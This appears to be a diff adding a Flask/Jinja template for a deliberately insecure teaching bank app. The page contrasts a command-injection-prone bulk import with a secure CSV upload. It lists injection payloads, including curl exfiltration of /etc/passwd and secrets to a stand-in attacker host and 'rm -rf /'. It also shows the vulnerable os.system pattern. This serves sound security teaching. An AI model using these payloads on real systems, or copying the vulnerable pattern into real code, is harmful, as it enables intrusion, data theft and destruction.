@@ -1,0 +1,338 @@
+{% extends "base.html" %}
+
+{% block title %}
+    {% if vulnerable %}SQL Injection Demo{% else %}Secure Bulk Import{% endif %} - RMIT NeoBank
+{% endblock %}
+
+{% block content %}
+<!-- Breadcrumb -->
+<nav aria-label="breadcrumb" class="mb-3">
+    <ol class="breadcrumb">
+        <li class="breadcrumb-item"><a href="{{ url_for('dashboard') }}">Dashboard</a></li>
+        <li class="breadcrumb-item active">
+            {% if vulnerable %}Vulnerable Bulk Import{% else %}Secure Bulk Import{% endif %}
+        </li>
+    </ol>
+</nav>
+
+{% if vulnerable %}
+<!-- ========================================================================= -->
+<!-- VULNERABLE IMPLEMENTATION (Command Injection Demo)                        -->
+<!-- ========================================================================= -->
+
+<div class="alert alert-danger shadow-lg" role="alert">
+    <h4 class="alert-heading">
+        <i class="bi bi-exclamation-triangle-fill"></i> ⚠️ COMMAND INJECTION VULNERABILITY
+    </h4>
+    <p><strong>This is a DELIBERATELY INSECURE implementation for educational purposes.</strong></p>
+    <hr>
+    <h6>Vulnerability: CWE-78 (OS Command Injection)</h6>
+    <p class="mb-2"><strong>What's Wrong:</strong></p>
+    <ul>
+        <li>User input (filename) is directly concatenated into a shell command</li>
+        <li>Uses <code>os.system()</code> which spawns a shell subprocess</li>
+        <li>No input validation or sanitization</li>
+        <li>Attacker can inject shell metacharacters to execute arbitrary commands</li>
+    </ul>
+    <p class="mb-2"><strong>Attack Examples:</strong></p>
+    <pre class="bg-dark text-light p-2 rounded">data.csv; whoami               # Linux: Execute whoami command
+data.csv & dir                 # Windows: List directory
+data.csv | curl http://attacker.com/exfil -d @/etc/passwd   # Exfiltrate data
+data.csv; rm -rf /             # Destructive (DO NOT ACTUALLY RUN)</pre>
+    <p class="mb-0">
+        <a href="{{ url_for('secure_bulk_import') }}" class="btn btn-success btn-sm">
+            <i class="bi bi-shield-check"></i> View Secure Implementation
+        </a>
+    </p>
+</div>
+
+<div class="card border-danger">
+    <div class="card-header bg-danger text-white">
+        <h4 class="mb-0">
+            <i class="bi bi-bug-fill"></i> Vulnerable Bulk Import (Command Injection)
+        </h4>
+    </div>
+    <div class="card-body">
+        <form method="post">
+            <div class="row g-3">
+                <div class="col-md-8">
+                    <label for="filename" class="form-label">
+                        <i class="bi bi-file-earmark"></i> Filename (on server)
+                    </label>
+                    <input type="text" class="form-control form-control-lg" id="filename" name="filename" 
+                           placeholder="e.g., data.csv" required>
+                    <small class="text-muted">
+                        Enter a filename that will be passed directly to: 
+                        <code>python scripts/import_applications.py {filename}</code>
+                    </small>
+                </div>
+                <div class="col-md-4 d-flex align-items-end">
+                    <button type="submit" class="btn btn-danger btn-lg w-100">
+                        <i class="bi bi-exclamation-triangle"></i> Execute (Vulnerable)
+                    </button>
+                </div>
+            </div>
+        </form>
+        
+        {% if command_executed %}
+        <div class="alert alert-warning mt-3" role="alert">
+            <h6><i class="bi bi-terminal"></i> Command That Would Be Executed:</h6>
+            <pre class="bg-dark text-warning p-3 rounded mb-0"><strong>$ {{ command_executed }}</strong></pre>
+        </div>
+        {% endif %}
+        
+        <!-- Attack Payloads Examples -->
+        <div class="mt-4">
+            <h6>🔥 Try These Attack Payloads:</h6>
+            <div class="row g-2">
+                <div class="col-md-6">
+                    <div class="card bg-light">
+                        <div class="card-body py-2">
+                            <strong>Linux/Mac:</strong><br>
+                            <code class="text-danger">data.csv; whoami</code><br>
+                            <small class="text-muted">Reveals server username</small>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="card bg-light">
+                        <div class="card-body py-2">
+                            <strong>Windows:</strong><br>
+                            <code class="text-danger">data.csv & whoami</code><br>
+                            <small class="text-muted">Reveals server username</small>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="card bg-light">
+                        <div class="card-body py-2">
+                            <strong>Directory Listing:</strong><br>
+                            <code class="text-danger">data.csv; ls -la</code> or <code>data.csv & dir</code><br>
+                            <small class="text-muted">List server files</small>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="card bg-light">
+                        <div class="card-body py-2">
+                            <strong>Data Exfiltration:</strong><br>
+                            <code class="text-danger">x; curl attacker.com -d @secrets.txt</code><br>
+                            <small class="text-muted">Send files to attacker</small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Technical Explanation -->
+<div class="card mt-4 border-info">
+    <div class="card-header bg-info text-white">
+        <h5 class="mb-0">
+            <i class="bi bi-book"></i> Technical Explanation
+        </h5>
+    </div>
+    <div class="card-body">
+        <h6>Why Is This Vulnerable?</h6>
+        <p>The vulnerable code looks like this:</p>
+        <pre class="bg-light p-3 border rounded">filename = request.form.get("filename")
+command = f"python scripts/import_applications.py {filename}"
+os.system(command)  # 🚨 VULNERABLE!</pre>
+        
+        <p class="mt-3"><strong>The Problem:</strong></p>
+        <ol>
+            <li><code>os.system()</code> spawns a shell (cmd.exe on Windows, /bin/sh on Linux)</li>
+            <li>Shell interprets metacharacters: <code>;</code> <code>|</code> <code>&amp;</code> <code>`</code> <code>$()</code></li>
+            <li>User input is directly concatenated without escaping/validation</li>
+            <li>Attacker can inject additional commands using these metacharacters</li>
+        </ol>
+        
+        <p class="mt-3"><strong>Real-World Impact:</strong></p>
+        <ul>
+            <li><strong>Data Theft:</strong> Exfiltrate customer PII, financial records, credentials</li>
+            <li><strong>System Compromise:</strong> Install backdoors, create admin accounts</li>
+            <li><strong>Ransomware:</strong> Encrypt files and demand payment</li>
+            <li><strong>DoS:</strong> Delete critical files, crash services</li>
+            <li><strong>Lateral Movement:</strong> Use compromised server to attack internal network</li>
+        </ul>
+        
+        <p class="mb-0">
+            <strong>Example Incident:</strong> Equifax (2017) - Command injection in Apache Struts led to 147 million records stolen, 
+            $700M+ in fines and settlements.
+        </p>
+    </div>
+</div>
+
+{% else %}
+<!-- ========================================================================= -->
+<!-- SECURE IMPLEMENTATION (File Upload with CSV Parsing)                      -->
+<!-- ========================================================================= -->
+
+<div class="alert alert-success shadow-lg" role="alert">
+    <h4 class="alert-heading">
+        <i class="bi bi-shield-check-fill"></i> ✅ SECURE IMPLEMENTATION
+    </h4>
+    <p><strong>This implementation follows security best practices.</strong></p>
+    <hr>
+    <h6>Security Controls:</h6>
+    <ul class="mb-0">
+        <li><strong>File Upload:</strong> Uses Flask's <code>request.files</code> (no shell commands)</li>
+        <li><strong>CSV Parsing:</strong> Python's <code>csv</code> module (no external executables)</li>
+        <li><strong>File Type Validation:</strong> Only .csv files accepted</li>
+        <li><strong>Safe Filename:</strong> Generated server-side (prevents path traversal)</li>
+        <li><strong>Input Validation:</strong> Each row validated before database insertion</li>
+        <li><strong>RBAC:</strong> Only HO officers can use this feature</li>
+    </ul>
+</div>
+
+<div class="card border-success">
+    <div class="card-header bg-success text-white">
+        <h4 class="mb-0">
+            <i class="bi bi-shield-check"></i> Secure Bulk Import (File Upload)
+        </h4>
+    </div>
+    <div class="card-body">
+        <form method="post" enctype="multipart/form-data">
+            <div class="row g-3">
+                <div class="col-md-8">
+                    <label for="csv_file" class="form-label">
+                        <i class="bi bi-file-earmark-arrow-up"></i> Upload CSV File
+                    </label>
+                    <input type="file" class="form-control form-control-lg" id="csv_file" name="csv_file" 
+                           accept=".csv" required>
+                    <small class="text-muted">
+                        <strong>Required columns:</strong> applicant_name, national_id, dob, contact_phone, 
+                        contact_email, product_code, requested_amount, tenure_months
+                    </small>
+                </div>
+                <div class="col-md-4 d-flex align-items-end">
+                    <button type="submit" class="btn btn-success btn-lg w-100">
+                        <i class="bi bi-upload"></i> Upload & Import (Secure)
+                    </button>
+                </div>
+            </div>
+        </form>
+        
+        {% if imported_count %}
+        <div class="alert alert-success mt-3" role="alert">
+            <h5 class="alert-heading">
+                <i class="bi bi-check-circle-fill"></i> Import Successful
+            </h5>
+            <p class="mb-0">
+                <strong>{{ imported_count }}</strong> applications imported successfully.
+                {% if error_count %}
+                <br><span class="text-warning">{{ error_count }} rows failed validation and were skipped.</span>
+                {% endif %}
+            </p>
+        </div>
+        {% endif %}
+        
+        <!-- CSV Template Download -->
+        <div class="mt-4">
+            <h6><i class="bi bi-file-earmark-spreadsheet"></i> CSV Template Example:</h6>
+            <div class="card bg-light">
+                <div class="card-body">
+                    <pre class="mb-0" style="font-size: 0.85rem;">application_ref,applicant_name,national_id,dob,contact_phone,contact_email,product_code,requested_amount,tenure_months,branch_code,remarks
+APP-001,Nguyen Van An,001234567890,1990-05-15,+84901234567,nguyen.van.an@example.com,PL_SAL,50000000,36,HCM01,First time customer
+APP-002,Tran Thi Binh,009876543210,1985-08-22,+84909876543,tran.thi.binh@example.com,HL_STD,200000000,240,HN01,Home loan for new property</pre>
+                </div>
+            </div>
+            <small class="text-muted">
+                💡 Copy this template to create your CSV file. Save as UTF-8 encoding.
+            </small>
+        </div>
+    </div>
+</div>
+
+<!-- Technical Explanation -->
+<div class="card mt-4 border-info">
+    <div class="card-header bg-info text-white">
+        <h5 class="mb-0">
+            <i class="bi bi-book"></i> Security Implementation Details
+        </h5>
+    </div>
+    <div class="card-body">
+        <h6>How Does This Prevent Command Injection?</h6>
+        <p>The secure code looks like this:</p>
+        <pre class="bg-light p-3 border rounded">file = request.files.get("csv_file")
+
+# Validate file extension
+if not file.filename.lower().endswith(".csv"):
+    return error
+
+# Save to controlled directory
+safe_filename = f"import_{user_id}_{timestamp}.csv"
+filepath = os.path.join(UPLOAD_FOLDER, safe_filename)
+file.save(filepath)
+
+# Parse with Python csv module (NO SHELL)
+with open(filepath, newline="", encoding="utf-8-sig") as f:
+    reader = csv.DictReader(f)
+    for row in reader:
+        # Validate and insert each row
+        app = LoanApplication(...)
+        db.session.add(app)</pre>
+        
+        <p class="mt-3"><strong>Key Differences from Vulnerable Version:</strong></p>
+        <div class="row g-3">
+            <div class="col-md-6">
+                <div class="card border-danger">
+                    <div class="card-header bg-danger text-white">
+                        <strong>❌ Vulnerable</strong>
+                    </div>
+                    <div class="card-body">
+                        <ul class="small mb-0">
+                            <li>User provides filename STRING</li>
+                            <li>String passed to shell via os.system()</li>
+                            <li>Shell interprets metacharacters</li>
+                            <li>Attacker controls execution</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card border-success">
+                    <div class="card-header bg-success text-white">
+                        <strong>✅ Secure</strong>
+                    </div>
+                    <div class="card-body">
+                        <ul class="small mb-0">
+                            <li>User uploads FILE (binary)</li>
+                            <li>No shell commands executed</li>
+                            <li>Python csv library parses safely</li>
+                            <li>Complete control over process</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <p class="mt-3"><strong>Additional Security Layers:</strong></p>
+        <ol>
+            <li><strong>File Extension Validation:</strong> Only .csv allowed (blocks .exe, .sh, etc.)</li>
+            <li><strong>File Size Limit:</strong> Max 16MB configured in Flask (prevents DoS)</li>
+            <li><strong>Safe Filename Generation:</strong> Server generates filename (prevents path traversal like ../../etc/passwd)</li>
+            <li><strong>Controlled Directory:</strong> Files saved to specific <code>uploads/</code> folder only</li>
+            <li><strong>Row-Level Validation:</strong> Each row validated before insertion (type checks, range checks)</li>
+            <li><strong>Transaction Rollback:</strong> If error occurs, no partial data committed</li>
+            <li><strong>RBAC:</strong> Only HO officers allowed (prevents unauthorized bulk imports)</li>
+        </ol>
+        
+        <p class="mb-0">
+            <strong>Defense in Depth:</strong> Multiple security controls ensure that even if one layer fails, 
+            others provide protection.
+        </p>
+    </div>
+</div>
+
+{% endif %}
+
+<!-- Back Button -->
+<div class="mt-4">
+    <a href="{{ url_for('dashboard') }}" class="btn btn-secondary">
+        <i class="bi bi-arrow-left"></i> Back to Dashboard
+    </a>
+</div>
+
+{% endblock %}
